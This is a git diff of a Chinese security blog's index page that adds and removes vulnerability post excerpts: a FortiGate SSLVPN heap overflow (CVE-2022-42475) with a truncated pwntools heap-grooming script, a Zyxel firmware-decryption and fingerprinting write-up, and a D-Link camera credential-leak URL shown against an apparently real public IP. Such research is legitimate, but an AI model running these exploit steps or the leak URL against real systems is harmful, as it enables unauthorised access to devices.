@@ -346,6 +346,32 @@ bin文件夹下没有东西，那么整个系统是怎么运行的呢？我们�
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析 漏洞简介 该漏洞存在于Fortigate中的SSLVPN服务上，由于对Content-Length值的错误处理，并且没有控制数据包的长度，导致了堆溢出。
+漏洞范围 5.0.0 &lt;= FortiOS &lt;= 5.0.145.2.0 &lt;= FortiOS &lt;= 5.2.155.4.0 &lt;= FortiOS &lt;= 5.4.135.6.0 &lt;= FortiOS &lt;= 5.6.146.0.0 &lt;= FortiOS &lt;= 6.0.156.2.0 &lt;= FortiOS &lt;= 6.2.116.4.0 &lt;= FortiOS &lt;= 6.4.107.0.0 &lt;= FortiOS &lt;= 7.0.87.2.0 &lt;= FortiOS &lt;= 7.2.21.0.0 &lt;= Fortiproxy &lt;= 1.0.71.1.0 &lt;= Fortiproxy &lt;= 1.1.61.2.0 &lt;= Fortiproxy &lt;= 1.2.132.0.0 &lt;= Fortiproxy &lt;= 2....</p>
+  </div>
+  <footer class="entry-footer">3 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用" href="https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>飞塔堆溢出漏洞利用方式 查看偏移 我们使用以下的脚本，发送包，查看偏移：
+import socketimport sslfrom pwn import *import pwnpath = &#34;/remote/login&#34;.encode()ip = &#34;192.168.113.66&#34;port = 10443padding = b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnza&#39;def create_ssl_ctx():_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.connect((ip, port))_default_context = ssl._create_unverified_context()_socket = _default_context.wrap_socket(_socket)return _socketdef make_socks(payload):socks = []for i in range(60):sk = create_ssl_ctx()data = b&#34;POST &#34; &#43; path &#43; b&#34; HTTP/1.1\r\nHost: 192.168.113.1\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&#34;sk.sendall(data)socks.append(sk)for i in range(20, 40, 2):sk = socks[i]sk....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式" href="https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>CVE-2022-46641 D-Link dir-846命令注入漏洞
     </h2>
   </header>
@@ -376,58 +402,6 @@ sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd
   </div>
   <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to CVE-2022-46641 D-Link dir-846命令注入漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：
-ATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))
-在文章中有给出exp.
-通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关
-不过该漏洞没有买到设备，所以只能使用exp去找ip测试。
-寻找特征 固件解密 漏洞的特征我们需要去固件中找，固件则可以直接去官网下载（官网只能下载最近几个版本的固件）
-同时，固件是加密过的zip文件，具体的解密原理：[Zyxel设备固件提取与口令破解](Zyxel设备固件提取与口令破解|NOSEC安全讯息平台 - 白帽汇安全研究院)
-这里直接演示解压的过程。
-官网下载后是一个压缩包，解压后的文件夹如下：
-里面有一个xxx.ri的文件，该文件可以直接通过binwake解压出来，这里面存放着解压xxx.bin的密码
-binwalk -Me1 473AAAB0C0.ri 解压后可以看到一个zld_fsextract文件，这个文件就是用来解压xxx.bin的二进制文件
-这里我们file看一下这个文件：
-是mips n32的架构，这里我们先将zld_fsextract文件复制到xxx.bin同级目录，然后使用qemu来进行用户级模拟：
-./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 直接使用qemu模拟的话会报错：
-这里的权限不够不能使用sudo来解决，因为这里需要的是设备的权限，而不是物理机的权限。
-这里我们需要使用strace命令，来看看zld_fsextract文件的执行情况：
-strace -f -s 199 ./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 在函数的调用链中，可以看到一个execveat函数。而这个函数参数里的50QLc3QbsoeAX53dREVw8rTxwc5IAYYHa.eD45qyvU8TbD63Td/dUUaR7ilJGJc就是解压密码
-然后使用7z，输入密码，就可以解压：
-这里面有一个compress.img，这个就是根目录系统，直接解压就行：
-比较特征 这里我们选择的是compress\usr\local\zyxel-gui\htdocs\images\login.css
-这个文件里有直接记录当前reset.css版本号，并且可以直接访问：
-通过这一点就可以判断目标ip的固件版本
-ip测试 这里直接使用的上面的exp，判断版本号后也无法成功返回shell。并且没有设备，并不知道问题出在哪里</p>
-  </div>
-  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞" href="https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析） 该漏洞可以泄露用户的账号和密码，使用账号和密码可以登录页面。
-可以在网页上直接访问url，也可以使用脚本获得
-如果要访问url的话则需要使用如下的url：
-http://xxx.xxx.xxx.xxx:xxxx/config/getuser?index=0 获得账户密码后直接访问ip就可登录：
-http://xxx.xxx.xxx.xxx:xxxx 若要使用python脚本：
-USEG: ./exp http://ip:portor./exp https://ip:port 例如：
-http://14.100.101.68:8080/config/getuser?index=0 </p>
-  </div>
-  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）" href="https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
